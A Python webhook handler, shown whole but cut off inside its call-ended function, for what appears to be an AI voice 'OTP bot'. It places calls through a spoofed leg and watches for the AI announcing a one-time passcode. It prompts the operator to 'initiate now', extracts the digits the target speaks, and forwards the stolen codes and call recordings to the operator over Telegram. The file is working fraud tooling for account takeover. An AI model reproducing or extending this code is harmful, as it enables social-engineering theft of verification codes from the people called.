import json
import logging
import os
import re
import threading
import time
from datetime import datetime, timedelta
from typing import Optional

import requests
from flask import Response

from services.amd import AmdStateMachine, IVR_PATTERNS

logger = logging.getLogger(__name__)

# ======================================================================
# IVR / answering-machine transcript detection
# ======================================================================
# Vapi's voicemailDetection only catches recorded voicemail boxes. A live
# IVR ("thanks for calling ... press 1") answers with speech, so AMD labels
# it "human". We therefore ALSO read the actual customer transcript and, if
# it sounds like an automated menu, treat it as a machine call.
_IVR_PATTERNS = list(IVR_PATTERNS)

# MASTER SWITCH — Answering Machine Detection is FULLY DISABLED.
# When False (default production setting), NO AMD logic may hang up a call:
# the 11s credit wall, the background sweeper, and the machine/voicemail/IVR
# forced teardown are all inert. Calls are allowed to run until the target
# ends them or the operator hangs up. Set to True only to restore the old
# credit-safety behavior.
_AMD_ENABLED = False

_MACHINE_ENDED_REASONS = {
    "voicemail",
    "machine",
    "answering-machine",
    "fax",
    "customer-did-not-answer",
}

# Hard backstop: if a call sits connected this long without capturing an OTP,
# ANY human speech, or IVR speech, it is a dead/silent leg silently burning
# credits. Force it down. Once real speech or an OTP appears the watchdog is
# disarmed for the rest of the call, so legitimate multi-minute calls and the
# 5-minute scenario are never cut off by this.
_CALL_STALL_HARD_CAP_SECONDS = 180.0

# PRO CREDIT-SAFETY BUDGET: every call that enters an automated answerer
# (voicemail / IVR / machine) MUST be torn down within 11 seconds of the moment
# the call connects. This is a hard wall — NOT a waiter. It fires whenever AMD
# has not yet proven "human" within the budget, covering silent voicemail boxes
# and slow IVRs that slip past pattern/cadence matching. It is disarmed the
# instant a human verdict or an OTP is observed, so a real human conversation
# is never clipped.
_AMD_HARD_CAP_SECONDS = 11.0

# If no explicit answer/stamp event ever arrives, the wall still engages once the
# call has lived past the dialing grace. This guarantees an automated / silent /
# voicemail leg can never run unbounded even when Vapi neglects to send a
# connect signal. (A human verdict or OTP still disarms it before this point.)
_AMD_DIALING_GRACE_SECONDS = 15.0

# Phrases the AI says right before/when delivering the one-time passcode.
# We use these to tell the operator the call is at the "code stage" so they
# can start the real OTP flow on their side at the right moment.
_PASSCODE_STAGE_PATTERNS = [
    re.compile(r"\b(one[ -]time|verification|security|confirmation|access)\b[^\n]{0,30}\b(pass ?code|code|pin)\b", re.I),
    re.compile(r"\b(i(?:'ve| have)? just sent)\b", re.I),
    re.compile(r"\b(sending|sent) (you )?(a |your |the )?(pass ?code|code|pin)\b", re.I),
    re.compile(r"\b(texted|texting) (you|it)\b", re.I),
    re.compile(r"\b(your code|the code|this code|the pass ?code)\b[^\n]{0,30}\b(be |is )?(\d|\n)", re.I),
    re.compile(r"\b(receive|should receive|will receive|got|getting)[^\n]{0,20}\b(code|pass ?code|pin)\b", re.I),
]


def _detect_passcode_stage(text: str) -> Optional[str]:
    """Return a label if the assistant message announces an OTP delivery."""
    if not text:
        return None
    sample = text.strip()
    if len(sample) < 6:
        return None
    # Deterministic anchor: the PromptBuilder locks Stage 3 to this exact line,
    # so the operator notice does not depend on regex luck with model phrasing.
    if "one-time passcode" in sample.lower() and "sent" in sample.lower():
        return "I've just sent a one-time passcode"
    for pattern in _PASSCODE_STAGE_PATTERNS:
        match = pattern.search(sample)
        if match:
            return match.group(0)[:60]
    return None


def _notify_passcode_stage(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict], snippet: str) -> None:
    """One-shot operator notice when the AI reaches the passcode stage."""
    try:
        from bot import get_call_session
        session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
        if session and session.get("passcode_stage_notified"):
            return
        if session:
            session["passcode_stage_notified"] = True
        chat_id = _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)
        if not chat_id:
            return
        logger.info("[VAPI_PASSCODE_STAGE] snippet=%s chat_id=%s", snippet, chat_id)
        _send_live_status(int(chat_id), "⏳ Target expects a code — initiate now")
    except Exception as e:
        logger.warning("[VAPI_PASSCODE_STAGE_ERROR] %s", e)


def _detect_ivr_in_transcript(text: str) -> Optional[str]:
    """Return the matched pattern if the customer speech looks like an IVR.

    Returns a short description of what matched (for the Telegram notice), or
    None when the text looks like a real human conversation.
    """
    if not text:
        return None
    sample = text.strip()
    if len(sample) < 4:
        return None
    for pattern in _IVR_PATTERNS:
        match = pattern.search(sample)
        if match:
            snippet = match.group(0)
            return f"IVR pattern '{snippet.strip()[:60]}'"
    return None


def _hangup_call(vapi_call_id: Optional[str], call_sid: Optional[str]) -> None:
    """Force-end the call to stop credit usage immediately.

    The Vapi session is the only telephony leg: ending it tears the call down
    (Vapi sends BYE to Asterisk, which drops the SpoofGlobal leg).
    """
    logger.info("[VAPI_HANGUP] vapi_call_id=%s call_sid=%s", vapi_call_id, call_sid)
    if vapi_call_id:
        try:
            from services.vapi_service import end_call as vapi_end_call
            ok = vapi_end_call(vapi_call_id)
            logger.info("[VAPI_HANGUP] vapi end_call ok=%s id=%s", ok, vapi_call_id)
        except Exception as e:
            logger.warning("[VAPI_HANGUP_ERROR] vapi side: %s", e)


def _stamp_call_connected(session) -> None:
    """Record the moment the leg actually answers; anchors the 11s AMD budget.
    Idempotent (only sets it once, on the first answer signal)."""
    if session is None:
        return
    if not session.get("call_connected_at"):
        session["call_connected_at"] = datetime.utcnow()


def _amd_budget_anchor(session) -> Optional[datetime]:
    """Best-known time the call leg came up, for the 11s AMD wall.

    1. Explicit answer stamp (call.answered / call.in-progress / real Vapi
       inProgress / transcript evidence) when present.
    2. Otherwise the call's start time plus the dialing grace — so a leg that
       never produced a connect signal (silent box, Vapi omission) is still
       bounded instead of running forever.
    """
    if not session:
        return None
    connected = session.get("call_connected_at")
    if connected:
        return connected
    started = session.get("call_started_at")
    if started:
        return started + timedelta(seconds=_AMD_DIALING_GRACE_SECONDS)
    return None


def _record_human_or_ivr_speech(session, is_ivr: bool) -> None:
    """Track observed customer speech on the session.

    Only human-like (non-IVR) speech disarms the stall watchdog. Recognized IVR
    speech is handled by the immediate machine-hangup path; unrecognized machine
    chatter leaves the watchdog armed so a silent leg still gets force-ended.
    """
    if not session:
        return
    session["stall_seen_speech"] = True
    if not is_ivr:
        session["stall_seen_human_speech"] = True


def _check_call_stalled(session, payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict]) -> bool:
    """PRO AMD credit-safety budget: force-hangup if AMD has not proven human
    within 11s of the call connecting.

    DISABLED by default (_AMD_ENABLED False) — this never hangs up a call. The
    logic is left intact only for reference when AMD is re-enabled.
    """
    if not _AMD_ENABLED:
        return False
    if not session:
        return False
    if session.get("amd_budget_fired") or session.get("otp"):
        return False
    if session.get("stall_seen_human_speech"):
        return False

    started_at = _amd_budget_anchor(session)
    if not started_at:
        return False
    elapsed = (datetime.utcnow() - started_at).total_seconds()
    if elapsed < _AMD_HARD_CAP_SECONDS:
        return False

    # Cap reached: hang it up unless a human verdict/OTP was observed.
    session["amd_budget_fired"] = True
    logger.info(
        "[VAPI_AMD_BUDGET] call=%s vapi_call_id=%s elapsed=%.0fs reason=machine-or-silent-allocated",
        call_sid, vapi_call_id, elapsed,
    )
    chat_id = _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)
    if chat_id:
        _send_live_status(int(chat_id), "🤖 Machine detected. Hanging up.")
    threading.Thread(
        target=_hangup_call, args=(vapi_call_id, call_sid), daemon=True
    ).start()
    return True


_AMD_SWEEP_INTERVAL_SECONDS = 3.0
_amd_sweeper_started = False


def _sweep_amd_budget() -> None:
    """Background sweeper: enforces the 11s AMD budget even for silent legs
    that stop emitting webhooks (silent voicemail boxes / dead air).

    DISABLED by default (_AMD_ENABLED False) — no forced hangup.
    """
    if not _AMD_ENABLED:
        return
    try:
        from bot import get_session_manager
        manager = get_session_manager()
        if manager is None:
            return
        for _call_sid, session in manager.all_sessions():
            try:
                if session.get("amd_budget_fired") or session.get("otp"):
                    continue
                if session.get("stall_seen_human_speech"):
                    continue
                started_at = _amd_budget_anchor(session)
                if not started_at:
                    continue
                elapsed = (datetime.utcnow() - started_at).total_seconds()
                if elapsed < _AMD_HARD_CAP_SECONDS:
                    continue
                session["amd_budget_fired"] = True
                vapi_call_id = session.get("vapi_call_id")
                call_sid = session.get("call_sid") or vapi_call_id
                logger.info(
                    "[VAPI_AMD_BUDGET_SWEEP] call=%s vapi_call_id=%s elapsed=%.0fs",
                    call_sid, vapi_call_id, elapsed,
                )
                chat_id = session.get("chat_id")
                if chat_id:
                    _send_live_status(int(chat_id), "🤖 Machine detected. Hanging up.")
                threading.Thread(
                    target=_hangup_call, args=(vapi_call_id, call_sid), daemon=True
                ).start()
            except Exception:
                logger.exception("[VAPI_AMD_BUDGET_SWEEP_ERROR]")
    except Exception:
        logger.exception("[VAPI_AMD_BUDGET_SWEEP_FAILED]")


def _start_amd_budget_sweeper() -> None:
    global _amd_sweeper_started
    if not _AMD_ENABLED:
        return
    if _amd_sweeper_started:
        return
    _amd_sweeper_started = True

    def _loop() -> None:
        while True:
            try:
                _sweep_amd_budget()
            except Exception:
                logger.exception("[VAPI_AMD_SWEEP_LOOP_ERROR]")
            time.sleep(_AMD_SWEEP_INTERVAL_SECONDS)

    threading.Thread(target=_loop, daemon=True).start()


def _handle_machine_detected(
    payload: dict,
    call_sid: Optional[str],
    vapi_call_id: Optional[str],
    call_data: Optional[dict],
    kind: str,
    snippet: str,
) -> None:
    """One-shot machine/IVR handling: notify the user and hang up both legs.

    DISABLED by default (_AMD_ENABLED False) — does NOT hang up or even notify,
    so an automated answerer is never force-terminated. Left intact for when
    AMD is re-enabled.
    """
    if not _AMD_ENABLED:
        return
    try:
        from bot import get_call_session
        session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
        if session and session.get("machine_detected_notified"):
            return
        if session:
            session["machine_detected_notified"] = True
            session["answered_by"] = "machine"

        chat_id = _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)
        if chat_id:
            kmap = {
                "ivr": "🤖 Automated system detected.",
                "voicemail": "📣 Voicemail detected. Hanging up.",
                "monologue": "🤖 Machine detected.",
            }
            head = kmap.get(kind)
            if head:
                text = f"{head} Hanging up."
            else:
                label = _human_or_machine_label(snippet)
                text = f"{label or '🤖 Machine detected.'} Hanging up."
            _send_live_status(int(chat_id), text)

        logger.info("[VAPI_MACHINE_DETECTED] kind=%s vapi_call_id=%s call_sid=%s snippet=%s",
                     kind, vapi_call_id, call_sid, snippet)
        threading.Thread(
            target=_hangup_call,
            args=(vapi_call_id, call_sid),
            daemon=True,
        ).start()
    except Exception as e:
        logger.warning("[VAPI_MACHINE_DETECTED_ERROR] %s", e)


def extract_otp_from_transcript(text: str, code_length: int = 6) -> Optional[str]:
    if not text:
        return None

    sep_pattern = r"\d[-\s]?" * (code_length - 1) + r"\d"
    patterns = [
        rf"\b(\d{{{code_length}}})\b",
        rf"(?<!\d)(\d\s?){{{code_length}}}(?!\d)",
        rf"\b({sep_pattern})\b",
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            raw = match.group(1) if match.lastindex else match.group(0)
            digits = re.sub(r"[^0-9]", "", raw)
            if len(digits) == code_length and digits.isdigit():
                return digits

    all_digits = re.sub(r"[^0-9]", "", text)
    for i in range(len(all_digits) - code_length + 1):
        candidate = all_digits[i:i + code_length]
        if len(candidate) == code_length and candidate.isdigit():
            return candidate
    return None


def _send_telegram(chat_id: int, text: str, **kwargs):
    if not chat_id:
        return
    try:
        from handlers.otp_notifier import _bot_instance
        if _bot_instance:
            _bot_instance.send_message(chat_id, text, **kwargs)
        else:
            import telebot
            token = os.getenv("BOT_TOKEN", "")
            if token and token != "YOUR_BOT_TOKEN_HERE":
                tb = telebot.TeleBot(token)
                tb.send_message(chat_id, text, **kwargs)
    except Exception as e:
        logger.warning("Failed to send Telegram message to %s: %s", chat_id, e)


def _send_live_status(chat_id, text: str, **kwargs) -> None:
    if not chat_id:
        return
    _send_telegram(int(chat_id), text, **kwargs)


def _human_or_machine_label(ended_reason: Optional[str]) -> Optional[str]:
    """Map Vapi's endedReason to a short human/machine Telegram notice.

    Vapi's Answering Machine Detection reports the answer type through
    ``endedReason`` (e.g. ``voicemail``, ``customer-did-not-answer``).
    Returns None when the reason doesn't imply a detected answer type.
    """
    if not ended_reason:
        return None
    lower = ended_reason.lower()
    if "fax" in lower:
        return "📠 Fax detected — call ended."
    if lower == "voicemail":
        return "📣 Voicemail / answering machine detected — call ended."
    if "did-not-answer" in lower or "no-answer" in lower:
        return "📵 No answer."
    if lower == "customer-busy" or "busy" in lower:
        return "📵 Line busy."
    if "ended" in lower or "hangup" in lower:
        return "👤 Human answered."
    return None


def _build_live_control_keyboard(sid: str):
    """Live-call action controls (single row, two actions).

    ``sid`` is the Vapi call UUID — the only identifier used for hangup/status.

    Two equally-weighted actions in one row — the pro pattern used by the OTP
    accept/decline controls — so the operator can stream or hang instantly
    without extra taps.
    """
    from telebot import types
    return types.InlineKeyboardMarkup().row(
        types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"),
        types.InlineKeyboardButton("📴 HANG UP", callback_data=f"force_hangup_{sid}"),
    )


def _notify_call_live(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict]) -> None:
    """Send one 'Call is live' Telegram message with live controls.

    Fires once per call thanks to the session flag. The buttons let the operator
    listen in or force-hang the call instantly via the Vapi call UUID.
    """
    try:
        from bot import get_call_session
        session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
        if session and session.get("call_live_notified"):
            return
        chat_id = _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)
        if not chat_id:
            return
        if session:
            session["call_live_notified"] = True
        _send_live_status(
            chat_id,
            "🔵 Call is live. Call in progress.",
            reply_markup=_build_live_control_keyboard(vapi_call_id or call_sid or "unknown"),
        )
    except Exception as e:
        logger.warning("[VAPI_CALL_LIVE_ERROR] %s", e)


def _extract_metadata(payload: dict, call_data: Optional[dict] = None) -> dict:
    return (
        payload.get("metadata")
        or (call_data or {}).get("metadata")
        or payload.get("message", {}).get("metadata")
        or {}
    )


def handle_vapi_webhook(request) -> Response:
    try:
        _start_amd_budget_sweeper()
        payload = request.get_json(force=True, silent=True)
        if not payload:
            return Response("Invalid payload", status=400)

        event_type = payload.get("type") or payload.get("event") or payload.get("message", {}).get("type")
        message_body = payload.get("message") or payload
        # `dict.get(key, default)` only substitutes the default when the key is
        # MISSING; a key present-but-null (Vapi sends `"call": null`) yields None.
        # Normalize with `or {}` so every downstream `.get` is safe.
        call_data = payload.get("call") or message_body.get("call") or {}
        vapi_call_id = call_data.get("id") or payload.get("callId") or message_body.get("callId")
        # The call is keyed by the Vapi call id; fall back so session/OTP/hangup
        # lookups work.
        call_sid = call_data.get("phoneCallProviderId") or vapi_call_id

        metadata = _extract_metadata(payload, call_data)
        chat_id = metadata.get("chat_id")

        logger.info("[VAPI_WEBHOOK] type=%s vapi_call_id=%s call_sid=%s chat_id=%s payload_keys=%s call_keys=%s",
                     event_type, vapi_call_id, call_sid, chat_id,
                     list(payload.keys()), list(call_data.keys()))

        if not chat_id:
            logger.info("[VAPI_WEBHOOK] no chat_id — payload top keys=%s call keys=%s",
                         list(payload.keys()), list(call_data.keys()))

        # Backstop for silent/stuck legs: resolve the session and force-hangup
        # if the call is connected past the cap with no OTP and no human speech.
        # Runs on every live webhook so the check fires even when a silent leg
        # never produces a customer transcript.
        from bot import get_call_session
        _stall_session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
        if event_type not in ("call.ended", "call.completed", "call.failed", "call.error", "end-of-call-report") and _check_call_stalled(_stall_session, payload, call_sid, vapi_call_id, call_data):
            return Response("OK")

        if event_type in ("call.started", "call.ringing"):
            return Response("OK")

        if event_type == "call.answered":
            _stamp_call_connected(_stall_session)
            _notify_call_live(payload, call_sid, vapi_call_id, call_data)
            return Response("OK")

        if event_type in ("call.in-progress", "call.in_progress", "call.inProgress", "call.inprogress"):
            _stamp_call_connected(_stall_session)
            _notify_call_live(payload, call_sid, vapi_call_id, call_data)
            return Response("OK")

        if event_type in ("transcript", "transcription", "call.transcript"):
            return _handle_transcript(payload, call_sid, vapi_call_id, call_data)

        if event_type in ("call.ended", "call.completed", "call.failed", "call.error"):
            return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)

        if event_type in ("recording.ready", "recording"):
            return _handle_recording(payload, call_sid, vapi_call_id, call_data)

        if event_type in ("assistant.started", "call.assistantStarted", "call.assistant-started", "call.assistant_started"):
            # Vapi sends the assistant-started event at the earliest point the
            # AI session is alive — treat it as the leg-answered anchor and
            # fire the "Call is live" notice right away.
            _stamp_call_connected(_stall_session)
            _notify_call_live(payload, call_sid, vapi_call_id, call_data)
            return Response("OK")

        if event_type in ("speech-update", "conversation-update"):
            return _handle_transcript(payload, call_sid, vapi_call_id, call_data)

        if event_type == "status-update":
            # The authoritative call status lives on message.status.
            call_status = message_body.get("status")
            if not call_status:
                call_status = call_data.get("status", "")
            logger.info("[VAPI_STATUS_UPDATE] status=%s call_sid=%s vapi_call_id=%s",
                         call_status, call_sid, vapi_call_id)
            if call_status in ("in-progress", "answered"):
                from bot import get_call_session
                s = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
                if s:
                    s["call_was_in_progress"] = True
                    _stamp_call_connected(s)
                _notify_call_live(payload, call_sid, vapi_call_id, call_data)
            elif call_status in ("completed", "failed", "canceled", "ended", "no-answer", "busy", "error", "queued"):
                # "ended" arrives as a status-update with message.status=ended
                # plus endedReason on message.endedReason.
                return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)
            return Response("OK")

        if event_type == "end-of-call-report":
            logger.info("[VAPI_END_OF_CALL_REPORT] call_sid=%s vapi_call_id=%s", call_sid, vapi_call_id)
            return _handle_call_ended(payload, call_sid, vapi_call_id, call_data)

        logger.info("[VAPI_UNKNOWN_EVENT] type=%s", event_type)
        return Response("OK")

    except Exception as e:
        logger.error("[VAPI_WEBHOOK_ERROR] %s", e, exc_info=True)
        return Response("Error", status=500)


def _extract_otp_from_messages(
    messages: list,
    code_length: int,
    call_sid: Optional[str],
    vapi_call_id: Optional[str],
    chat_id: Optional[int],
    user_id: Optional[str],
) -> Optional[str]:
    for msg in messages:
        role = msg.get("role", "")
        if role != "customer":
            continue
        text = msg.get("transcript") or msg.get("content") or msg.get("text") or msg.get("message") or ""
        if not text:
            continue
        otp = extract_otp_from_transcript(text, code_length)
        if otp:
            logger.info("[VAPI_OTP_DETECTED_ARTIFACT] otp=%s call_sid=%s", otp, call_sid)
            _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
            if chat_id and call_sid:
                from handlers.otp_notifier import notify_otp_captured
                notify_otp_captured(
                    chat_id=int(chat_id),
                    call_sid=call_sid,
                    user_id=user_id or "unknown",
                    digits=otp,
                    vapi_call_id=vapi_call_id,
                )
            return otp
    return None


def _extract_turn_text(obj: dict) -> str:
    """Pull the transcript text out of a speech/message/message-entry dict,
    whatever key Vapi used (transcript/content/text/message/transcription).

    Only string values are returned. The top-level ``message`` key may hold the
    whole wrapper dict, but the isinstance(str) guard skips it safely.
    """
    if not obj:
        return ""
    for key in ("transcript", "content", "text", "message", "transcription"):
        value = obj.get(key)
        if isinstance(value, str) and value:
            return value
    return ""


def _turn_entries(payload: dict, message: dict):
    """Best-effort list of role/content transcript entries, newest first.

    Real Vapi payloads carry the live transcript in several shapes, verified
    from captured webhooks:
      - ``message.conversation``      : list of {role, content}
      - ``message.artifact.messages`` : list of {role, message}
      - ``message.messages``          : list of {role, message}
    Prefer conversation, then artifact.messages, then messages, then the same
    keys on the payload top level. Entries are returned newest-first.
    """
    artifact = message.get("artifact") if isinstance(message.get("artifact"), dict) else {}
    containers = (
        message.get("conversation"),
        artifact.get("messages"),
        message.get("messages"),
        payload.get("conversation"),
        payload.get("messages"),
    )
    for container in containers:
        if isinstance(container, list) and container:
            for entry in reversed(container):
                if isinstance(entry, dict) and entry.get("role"):
                    yield entry


def _extract_transcript_turn(payload: dict, message: dict, event_type: str):
    """Return (transcript_text, role) for the newest turn in the payload.

    Vapi nests the live transcript under the top-level ``message`` key
    (``payload_keys=['message']``). The customer's speech is under
    ``message.conversation`` as ``{role, content}``; we read conversation,
    then messages, from both the wrapper and the payload top level.
    """
    transcript_text = ""
    role = "assistant"

    if event_type in ("transcript", "transcription", "call.transcript"):
        transcript_text = _extract_turn_text(message)
        role = message.get("role", "assistant")
        if not transcript_text:
            transcript_text = _extract_turn_text(payload)
            role = payload.get("role", role)
    elif event_type == "speech-update":
        speech = message.get("speech") or payload.get("speech") or {}
        transcript_text = _extract_turn_text(speech)
        if not transcript_text:
            transcript_text = _extract_turn_text(message)
        role = speech.get("role") or message.get("role", "assistant")
        # Speech-update may carry the actual utterance in artifact.messages.
        if not transcript_text:
            for entry in _turn_entries(payload, message):
                msg_role = str(entry.get("role", "")).lower()
                if msg_role in ("user", "customer", "human"):
                    text = _extract_turn_text(entry)
                    if text:
                        transcript_text = text
                        role = "customer"
                        break
                elif msg_role in ("bot", "assistant"):
                    text = _extract_turn_text(entry)
                    if text:
                        transcript_text = text
                        role = "assistant"
                        break
    elif event_type in ("conversation-update",):
        # Vapi uses "user" for the callee and "bot"/"assistant" for the AI.
        for entry in _turn_entries(payload, message):
            msg_role = str(entry.get("role", "")).lower()
            if msg_role in ("user", "customer", "human"):
                text = _extract_turn_text(entry)
                if text:
                    transcript_text = text
                    role = "customer"
                    break
    return transcript_text, role


def _extract_assistant_turn(payload: dict, message: dict, event_type: str) -> str:
    """Newest assistant/bot utterance, for the passcode-stage notice."""
    if event_type == "conversation-update":
        for entry in _turn_entries(payload, message):
            msg_role = str(entry.get("role", "")).lower()
            if msg_role in ("bot", "assistant"):
                text = _extract_turn_text(entry)
                if text:
                    return text
        return ""
    return _extract_turn_text(message) or _extract_turn_text(payload)


def _handle_transcript(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
    try:
        # Real Vapi payloads arrive as {"message": {...}} with the type nested
        # inside message — fall back to message.type like the dispatcher does.
        event_type = (
            payload.get("type")
            or payload.get("event")
            or (payload.get("message") or {}).get("type")
            or ""
        )
        message = payload.get("message", payload)

        transcript_text, role = _extract_transcript_turn(payload, message, event_type)
        assistant_turn = _extract_assistant_turn(payload, message, event_type)

        metadata = _extract_metadata(payload, call_data)
        code_length = int(metadata.get("code_length", 6))
        user_id = metadata.get("user_id")
        chat_id = metadata.get("chat_id") or _resolve_chat_id(payload, call_sid, vapi_call_id, call_data)

        # Passcode stage: when the AI announces a one-time passcode, nudge the
        # operator once (no buttons) so they can start the OTP flow in time.
        passcode_source = None
        if role != "customer" and transcript_text:
            passcode_source = transcript_text
        elif assistant_turn:
            passcode_source = assistant_turn
        if passcode_source:
            stage_snippet = _detect_passcode_stage(passcode_source)
            if stage_snippet:
                _notify_passcode_stage(payload, call_sid, vapi_call_id, call_data, stage_snippet)

        if role == "customer" and transcript_text:
            otp = extract_otp_from_transcript(transcript_text, code_length)
            if otp:
                from bot import get_call_session
                session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
                if session and session.get("otp") == otp:
                    logger.info("[VAPI_OTP] duplicate OTP %s for call %s, skipping", otp, call_sid)
                    return Response("OK")
                logger.info("[VAPI_OTP_DETECTED] otp=%s call_sid=%s", otp, call_sid)
                _send_live_status(chat_id, f"🔑 OTP detected: {otp}")
                if chat_id:
                    from handlers.otp_notifier import notify_otp_captured
                    notify_otp_captured(
                        chat_id=int(chat_id),
                        call_sid=call_sid or vapi_call_id or "unknown",
                        user_id=user_id or "unknown",
                        digits=otp,
                        vapi_call_id=vapi_call_id,
                    )

        if role == "customer" and transcript_text:
            from bot import get_call_session
            session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
            # A real customer transcript proves the leg answered: anchor the AMD
            # budget from this moment even if no explicit status event arrived.
            _stamp_call_connected(session)
            # Real-time AMD: feed the turn into the per-call state machine.
            # It returns a verdict (voicemail/machine/human/pending) driven by
            # speech patterns + cadence — no fixed hangup timer.
            amd = AmdStateMachine(session)
            amd_result = amd.feed(role, transcript_text)

            if amd_result.is_terminal_machine():
                # Machine / voicemail: notify operator and hang up BOTH legs
                # immediately (before the recording beep). Do NOT count this as
                # human speech for the stall watchdog.
                _record_human_or_ivr_speech(session, is_ivr=True)
                _handle_machine_detected(
                    payload,
                    call_sid,
                    vapi_call_id,
                    call_data,
                    kind=amd_result.kind,
                    snippet=amd_result.reason,
                )
                return Response("OK")

            if amd_result.is_terminal_human():
                # Human confirmed: real human speech, so the stall watchdog must
                # stay disarmed for the rest of the call.
                _record_human_or_ivr_speech(session, is_ivr=False)
                return Response("OK")

            # Verdict still pending: this is unrecognized / noisy machine speech
            # (e.g. gibberish, low-confidence garbage, or a voicemail that never
            # says recognizable cue words). It is NOT proof of a human, so it
            # must NOT disarm the 11s AMD budget wall. Only a genuine human
            # greeting (AMD "human") or a captured OTP may disarm it.
            if session:
                session["stall_seen_speech"] = True
        return Response("OK")
    except Exception as e:
        logger.error("[VAPI_TRANSCRIPT_ERROR] %s", e)
        return Response("OK")


def _extract_recording_url(payload: dict, call_data: Optional[dict] = None) -> Optional[str]:
    """Pull the recording URL from whichever nesting Vapi used.

    Vapi nests it on the call object / artifact, sometimes under the top-level
    ``message`` wrapper, and sometimes ``call``/``artifact``/``message`` keys
    are present-but-null. This walks every candidate dict None-safely.
    """

    def _url_from(obj) -> Optional[str]:
        if not isinstance(obj, dict):
            return None
        url = obj.get("recordingUrl")
        if url:
            return url
        artifact = obj.get("artifact")
        if isinstance(artifact, dict) and artifact.get("recordingUrl"):
            return artifact["recordingUrl"]
        return None

    def _scan(*objs) -> Optional[str]:
        for obj in objs:
            url = _url_from(obj)
            if url:
                return url
            if isinstance(obj, dict):
                nested_call = obj.get("call")
                if isinstance(nested_call, dict):
                    url = _url_from(nested_call)
                    if url:
                        return url
        return None

    message = payload.get("message")
    return _scan(call_data, payload, message, payload.get("call"))


def _download_recording_file(recording_url: str, vapi_call_id: Optional[str] = None) -> Optional[bytes]:
    """Download the call recording, retrying with backoff.

    Vapi artifacts are written asynchronously, so the first GET can 404/400
    while the object is still landing. Each attempt uses a fresh presigned URL
    because R2 presigned links expire.
    """
    audio = _try_download_url(recording_url)
    if audio or not vapi_call_id:
        return audio

    try:
        from services.vapi_service import get_call
        call_data = get_call(vapi_call_id)
        fresh_url = None
        if call_data:
            fresh_url = (
                call_data.get("recordingUrl")
                or (call_data.get("artifact") or {}).get("recordingUrl")
            )
        if fresh_url and fresh_url != recording_url:
            logger.info("[VAPI_RECORDING] fresh URL from API, retrying download")
            return _try_download_url(fresh_url)
    except Exception as e:
        logger.warning("[VAPI_RECORDING] API fallback error=%s", e)

    return None


def _try_download_url(url: str) -> Optional[bytes]:
    for attempt in range(1, 4):
        try:
            resp = requests.get(url, timeout=120)
            if resp.status_code == 200 and len(resp.content) > 1024:
                logger.info("[VAPI_RECORDING] download OK size=%s attempt=%s", len(resp.content), attempt)
                return resp.content
            logger.info("[VAPI_RECORDING] download status=%s size=%s attempt=%s (url=%s)",
                         resp.status_code, len(resp.content or b""), attempt, url[:60])
        except Exception as e:
            logger.warning("[VAPI_RECORDING] download error=%s attempt=%s (url=%s)", e, attempt, url[:60])
        if attempt < 3:
            time.sleep(5)
    return None


def _send_audio_to_telegram(chat_id: int, audio_data: bytes, call_sid: Optional[str], ext: str) -> bool:
    from handlers.otp_notifier import _bot_instance
    import io
    audio_io = io.BytesIO(audio_data)
    audio_io.name = f"recording_{call_sid or 'unknown'}{ext}"
    try:
        if _bot_instance:
            _bot_instance.send_audio(chat_id, audio_io, caption="📞 Call recording", timeout=120)
        else:
            import telebot
            token = os.getenv("BOT_TOKEN", "")
            if token and token != "YOUR_BOT_TOKEN_HERE":
                tb = telebot.TeleBot(token)
                tb.send_audio(chat_id, audio_io, caption="📞 Call recording", timeout=120)
        return True
    except Exception as e:
        logger.warning("[VAPI_RECORDING] send_audio failed: %s", e)
        try:
            audio_io.seek(0)
            if _bot_instance:
                _bot_instance.send_document(chat_id, audio_io, caption="📞 Call recording", timeout=120)
            else:
                import telebot
                token = os.getenv("BOT_TOKEN", "")
                if token and token != "YOUR_BOT_TOKEN_HERE":
                    tb = telebot.TeleBot(token)
                    tb.send_document(chat_id, audio_io, caption="📞 Call recording", timeout=120)
            return True
        except Exception as e2:
            logger.error("[VAPI_RECORDING] send_document also failed: %s", e2)
            return False


def _resolve_chat_id(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict]) -> Optional[str]:
    metadata = _extract_metadata(payload, call_data)
    chat_id = metadata.get("chat_id")
    if chat_id:
        return chat_id
    session_id = call_sid or vapi_call_id
    if session_id:
        try:
            from bot import get_call_session
            session = get_call_session(session_id)
            if session and session.get("chat_id"):
                logger.info("[VAPI_CALL_ENDED] resolved chat_id from session %s", session_id)
                return session["chat_id"]
        except Exception:
            pass
    return None


def _handle_call_ended(payload: dict, call_sid: Optional[str], vapi_call_id: Optional[str], call_data: Optional[dict] = None) -> Response:
    try:
        # `payload.get("call", payload)` returns None when the key exists with
        # a null value; normalize so every `.get` below is safe.
        cd = call_data or payload.get("call") or payload
        message_body = payload.get("message") or payload
        # Vapi reports endedReason/durationMs on message.endedReason /
        # message.call.endedReason in status-update("ended") payloads; read both.
        duration_ms = cd.get("durationMs") or message_body.get("durationMs") or 0
        duration_s = round(duration_ms / 1000) if duration_ms else 0
        status = cd.get("status") or message_body.get("status") or "completed"
        ended_reason = cd.get("endedReason") or message_body.get("endedReason") or ""

        from bot import get_call_session
        session = get_call_session(call_sid) or (get_call_session(vapi_call_id) if vapi_call_id else None)
